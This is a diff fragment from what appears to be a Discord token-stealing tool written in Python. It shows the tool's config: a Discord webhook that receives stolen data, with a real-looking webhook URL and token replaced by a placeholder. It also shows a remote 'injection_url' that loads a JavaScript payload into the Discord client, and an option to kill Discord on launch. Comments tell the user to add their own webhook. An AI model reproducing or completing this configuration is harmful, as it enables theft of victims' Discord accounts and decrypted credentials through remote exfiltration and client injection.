@@ -19,7 +19,7 @@ from win32crypt import CryptUnprotectData
 
 config = {
     # replace WEBHOOK_HERE with your webhook
-    'webhook': "https://discord.com/api/webhooks/961747580549726259/ubXnwdayWB8G18Ff3X77qLuPiWCUGDxq9YqSWw1NU2MeLB695fr__9t-n9fsAgiDgA-8",
+    'webhook': "WEBHOOK_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # set to False if you don't want it to kill Discord upon running exe
